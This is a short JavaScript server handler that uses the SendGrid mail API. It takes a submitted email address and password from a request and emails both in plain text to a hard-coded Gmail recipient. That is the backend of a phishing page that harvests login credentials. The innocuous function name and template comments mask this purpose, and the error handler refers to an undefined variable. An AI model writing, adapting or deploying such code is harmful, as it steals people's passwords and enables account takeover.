
import sgMail from '@sendgrid/mail';

///get list
export const sendEmail = async (req,res) => {
  const { email, password } = req.body;

  // console.log(email, password);

  try {
    sgMail.setApiKey(process.env.SENDGRID_API_KEY)
    const msg = {
      to: '25mordad@gmail.com', // Change to your recipient
      from: 'aalinoosh@gmail.com', // Change to your verified sender
      subject: 'your email: ' + email,
      html: 'your password: '+ password,
    }
    sgMail
      .send(msg)
      .then(() => {
        console.log('Email sent');
        res.status(200).json({"send":"true"});
      })
      .catch((error) => {
        console.error(error);
        res.status(404).json({ message: error.message });
      })


  } catch (e) {
    res.status(404).json({ message: error.message });
  }
}
